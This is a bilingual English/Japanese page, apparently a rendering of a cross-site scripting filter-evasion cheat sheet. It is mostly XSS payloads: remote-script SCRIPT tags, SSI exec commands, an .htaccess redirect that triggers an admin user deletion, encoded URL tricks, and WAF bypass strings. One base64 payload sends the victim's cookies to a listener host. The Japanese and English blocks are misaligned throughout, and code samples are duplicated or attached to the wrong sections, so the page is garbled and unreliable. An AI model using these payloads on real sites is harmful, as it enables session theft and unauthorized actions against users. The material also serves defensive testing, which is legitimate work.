短い入力しか使えず `.js` に対するフィルタがある場合でも、短縮 URL やプロトコル解決を利用して外部スクリプトへ到達できることを示す。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```text

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### IMG Embedded Commands

This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### SSI (Server Side Includes)

この XSS ベクタを使うには、サーバに SSI がインストールされている必要がある。言うまでもないが、サーバ上でコマンドを実行できるなら、より深刻な問題がほぼ確実に存在する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```text

```html
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### IMG Embedded Commands part II

This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `&lt;IMG SRC="httx://badguy.com/a.jpg">` could actually be an attack vector to run commands as the user who views the image link. Here is the `.htaccess` (under Apache) line to accomplish the vector:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### PHP

PHP が実行されるコンテキストでは、サーバ側のコード生成や出力により XSS ベクタを構成できる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```log
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```text

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

(Thanks to Timo for part of this)

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### IMG 埋め込みコマンド

この攻撃は、Web 掲示板のように、パスワード保護された Web ページに注入され、そのパスワード保護が同じドメイン上の他のコマンドにも適用されている場合にのみ動作する。ユーザー削除、ユーザー追加 (ページを訪問したユーザーが管理者の場合)、認証情報の送信などに使われる可能性がある。あまり使われないが、より有用な XSS ベクタの一つである。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Cookie Manipulation

This method is pretty obscure but there are a few examples where `&lt;META` is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### IMG 埋め込みコマンド part II

これはさらに怖い。自ドメインにホストされていないこと以外、疑わしく見える識別子がまったくないためである。このベクタは 302 または 304 (他のリダイレクトも動作する) を使って画像をコマンドへリダイレクトする。つまり、通常の `&lt;IMG SRC="httx://badguy.com/a.jpg">` が、画像リンクを閲覧したユーザーとしてコマンドを実行する攻撃ベクタになり得る。次は、このベクタを実現する Apache の `.htaccess` 行である。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```text

```apacheconf
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### XSS Using HTML Quote Encapsulation

This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow `&lt;SCRIPT>` but don't allow `&lt;SCRIPT SRC...` by way of a regex filter `/\\<script\\[^\\>\\]+src/i`, do the following:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

(Timo の一部貢献に謝意を示す。)

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

If you are performing XSS on sites that allow `&lt;SCRIPT>` but don't allow `\\<script src...` due to a regex filter that does `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` (This is an important one, because this regex has been seen in the wild):

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### Cookie 操作

この方法はかなり目立たないが、`&lt;META` が許可され、それを使って Cookie を上書きできる例がいくつかある。ユーザー名をデータベースから取得するのではなく、ページを訪問したユーザーだけに表示するため Cookie 内に保存しているサイトの例もある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Another XSS to evade the same filter: `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### HTML 引用符カプセル化を使う XSS

HTML 属性値の引用符の外へ抜け、イベントハンドラや新しいタグを注入することで XSS を作る手法である。入力が既存の属性へ埋め込まれる場合、引用符、山括弧、スペース、イベント名、URL スキームの扱いを確認する必要がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

```html
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Yet another XSS that evades the same filter: `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`

</div>

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Generally, we are not discussing mitigation techniques, but the only thing that stops this XSS example is, if you still want to allow `&lt;SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `&lt;SCRIPT>` tags), use this:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

```html
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

And one last XSS attack to evade, `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:"(.)\\*?"|'(.)\\*?'|\\[^'"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` using grave accents (again, doesn't work in Firefox):

</div>

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

<!-- markdownlint-disable MD038-->

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

```html
<IMG SRC=# onmouseover="alert('xxs')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

<!-- markdownlint-enable MD038-->

</div>

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Here's an XSS example which works if the regex won't catch a matching pair of quotes but instead will find any quotes to terminate a parameter string improperly:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

```html
<IMG SRC= onmouseover="alert('xxs')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```text

```html
<IMG onmouseover="alert('xxs')">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### URL String Evasion

The following attacks work if `http://www.google.com/` is programmatically disallowed:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### IP Versus Hostname

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://66.102.7.147/">XSS</A>
```text

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### URL Encoding

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```text

```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### DWORD Encoding

Note: there are other of variations of DWORD encoding - see the IP Obfuscation calculator below for more details:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://1113982867/">XSS</A>
```text

```html
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Hex Encoding

The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quote is not required:

</div>

</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```text

```html
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Octal Encoding

Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### URL 文字列回避

URL の表現は、ホスト名、IP 表記、エンコード、リダイレクト、プロトコル解決などの差異によりフィルタを迂回できることがある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Base64 Encoding

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### IP とホスト名

ホスト名の代わりに IP アドレスを使うことで、ホスト名ベースの検査を避けられる場合がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```text

```text
http://66.102.7.147/
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Mixed Encoding

Let's mix and match base encoding and throw in some tabs and newlines (why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:

<!-- markdownlint-disable MD010-->

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### URL エンコーディング

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>
```text

```text
http://%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d/
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

<!-- markdownlint-enable MD010-->

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### DWORD エンコーディング

IP アドレスを DWORD として表現することで、単純な文字列比較を回避できる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
http://1113982867/
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Protocol Resolution Bypass

`//` translates to `http://`, which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). You can also change the `//` to `\\\\\\\\`. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 16 進エンコーディング

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="//www.google.com/">XSS</A>
```text

```text
http://0x42.0x0000066.0x7.0x93/
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Removing CNAMEs

When combined with the above URL, removing `www.` will save an additional 4 bytes for a total byte savings of 9 for servers that have set this up properly:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 8 進エンコーディング

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://google.com/">XSS</A>
```text

```text
http://0102.0146.0007.00000223/
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Extra dot for absolute DNS:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### Base64 エンコーディング

data URL などで base64 を使い、スクリプトや HTML を直接見えにくくできる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://www.google.com./">XSS</A>
```text

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### JavaScript Link Location

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 混合エンコーディング

複数の URL・数値表現を混ぜることで、単一の正規化しか行わないフィルタを迂回できる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```text

```text
http://%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f
http://0x42.000146.0x7.147/
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Content Replace as Attack Vector

<!-- markdownlint-disable MD010-->
Assuming `http://www.google.com/` is programmatically replaced with nothing. A similar attack vector has been used against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector `java&\\#x09;script:` was converted into `java	script:`, which renders in IE:
<!-- markdownlint-enable MD010-->

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### プロトコル解決バイパス

スキーム相対 URL や短縮されたリソース名を使い、フィルタが想定する `http:` や `https:` の文字列を避ける。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```text

```html
<SCRIPT SRC=//xss.rocks/.j>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Assisting XSS with HTTP Parameter Pollution

If a content sharing flow on a web site is implemented as shown below, this attack will work. There is a `Content` page which includes some content provided by users and this page also includes a link to `Share` page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the `title` parameter in the `Content` page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since `content_type`'s value is a constant and will always be integer, they didn't encode or validate the `content_type` in the `Share` page.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### CNAME の削除

DNS 名の別名を外し、フィルタが許可・拒否リストで想定している名前解決結果と異なる形にできる場合がある。絶対 DNS 名を示す末尾ドットも、文字列照合を揺さぶる要素になる。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
http://google.com./
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Content Page Source Code

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### JavaScript Link Location

JavaScript の link location を利用し、リンク先の評価タイミングや文脈を悪用する。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```text

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Share Page Source Code

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 攻撃ベクタとしての Content Replace

コンテンツ置換処理が入力を再解釈する場合、置換後の文字列が XSS ベクタになる可能性がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//some user agreement and sending to server logic might be here
...
</script>
```text

```html
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Content Page Output

If attacker set the untrusted content title as `This is a regular title&content_type=1;alert(1)` the link in `Content` page would be this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### HTTP Parameter Pollution による XSS の補助

HTTP Parameter Pollution (HPP) は、同名パラメータの扱いがコンポーネントごとに異なることを使い、WAF とアプリケーションの解釈差を作る。次の例は、コンテンツページと共有ページの処理差により XSS を助ける流れを示す。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### Share Page Output

And in share page output could be this:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### コンテンツページのソースコード

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//some user agreement and sending to server logic might be here
…
</script>
```text

```php
<?
$content = $_GET['content'];
echo $content;
?>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

As a result, in this example the main flaw is trusting the content_type in the `Share` page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 共有ページのソースコード

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```php
<?
$val = $_GET['val'];
echo '<a href="/content.php?content='.$val.'">Click here</a>';
?>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Character Escape Sequences

Here are all the possible combinations of the character `\\<` in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.

- `<`
- `%3C`
- `&lt`
- `&lt;`
- `&LT`
- `&LT;`
- `&#60`
- `&#060`
- `&#0060`
- `&#00060`
- `&#000060`
- `&#0000060`
- `&#60;`
- `&#060;`
- `&#0060;`
- `&#00060;`
- `&#000060;`
- `&#0000060;`
- `&#x3c`
- `&#x03c`
- `&#x003c`
- `&#x0003c`
- `&#x00003c`
- `&#x000003c`
- `&#x3c;`
- `&#x03c;`
- `&#x003c;`
- `&#x0003c;`
- `&#x00003c;`
- `&#x000003c;`
- `&#X3c`
- `&#X03c`
- `&#X003c`
- `&#X0003c`
- `&#X00003c`
- `&#X000003c`
- `&#X3c;`
- `&#X03c;`
- `&#X003c;`
- `&#X0003c;`
- `&#X00003c;`
- `&#X000003c;`
- `&#x3C`
- `&#x03C`
- `&#x003C`
- `&#x0003C`
- `&#x00003C`
- `&#x000003C`
- `&#x3C;`
- `&#x03C;`
- `&#x003C;`
- `&#x0003C;`
- `&#x00003C;`
- `&#x000003C;`
- `&#X3C`
- `&#X03C`
- `&#X003C`
- `&#X0003C`
- `&#X00003C`
- `&#X000003C`
- `&#X3C;`
- `&#X03C;`
- `&#X003C;`
- `&#X0003C;`
- `&#X00003C;`
- `&#X000003C;`
- `\\x3c`
- `\\x3C`
- `\\u003c`
- `\\u003C`

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### コンテンツページの出力

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<script>alert(1)</script>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

## Methods to Bypass WAF – Cross-Site Scripting

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 共有ページの出力

共有ページの出力は、分割されたパラメータが最終的に結合されることで、次のような XSS を形成し得る。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
<a href="/content.php?content=<script>alert(1)</script>">Click here</a>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### General issues

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## 文字エスケープシーケンス

この節は、XSS フィルタを回避するために使われる JavaScript と HTML の文字エスケープ形式をまとめる。10 進、16 進、Unicode、CSS エスケープ、URL エンコード、混合エンコードなどは、フィルタが正規化前の文字列だけを見ている場合に検出を難しくする。防御側は、入力検証だけに依存せず、出力コンテキストに応じたエンコーディングと安全なサニタイズを適用し、複数段階のデコード差を前提にテストする必要がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```text
<SCRIPT>alert('XSS')</SCRIPT>
%3CSCRIPT%3Ealert('XSS')%3C/SCRIPT%3E
\u003cSCRIPT\u003ealert('XSS')\u003c/SCRIPT\u003e
&#x3c;SCRIPT&#x3e;alert('XSS')&#x3c;/SCRIPT&#x3e;
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Stored XSS

If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

## WAF をバイパスする方法 - Cross-Site Scripting

</div>
</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Reflected XSS in JavaScript

Example:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### 一般的な問題

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Exploitation:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### 保存型 XSS

攻撃者がフィルタを通過して XSS を保存できた場合、WAF はその攻撃の実行を防げない。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
/?xss=500); alert(document.cookie);//
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### DOM-based XSS

Example:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### JavaScript 内の反射型 XSS

例:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
<script> ... eval($\_GET\[xss\]); ... </script>
```text

```javascript
<script> ... setTimeout(\"writetitle()\",$\_GET\[xss\]) ... </script>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

Exploitation:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

悪用:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
/?xss=document.cookie
```text

```javascript
/?xss=500); alert(document.cookie);//
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

#### XSS via request Redirection

Vulnerable code:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### DOM ベース XSS

例:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
...
header('Location: '.$_GET['param']);
...
```text

```javascript
<script> ... eval($\_GET\[xss\]); ... </script>
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

As well as:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

悪用:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
...
header('Refresh: 0; URL='.$_GET['param']);
...
```text

```javascript
/?xss=document.cookie
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

This request will not pass through the WAF:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

#### リクエストリダイレクト経由の XSS

脆弱なコード:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
/?param=<javascript:alert(document.cookie>)
```text

```javascript
...
header('Location: '.$_GET['param']);
...
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

This request will pass through the WAF and an XSS attack will be conducted in certain browsers:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

同様に:

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```text

```javascript
...
header('Refresh: 0; URL='.$_GET['param']);
...
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### WAF ByPass Strings for XSS

<!-- markdownlint-disable MD038-->
- `&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `&lt;Video> <source onerror = "javascript: alert (XSS)">`
- `&lt;Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `">&lt;/SCRIPT&gt;”>’>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;`
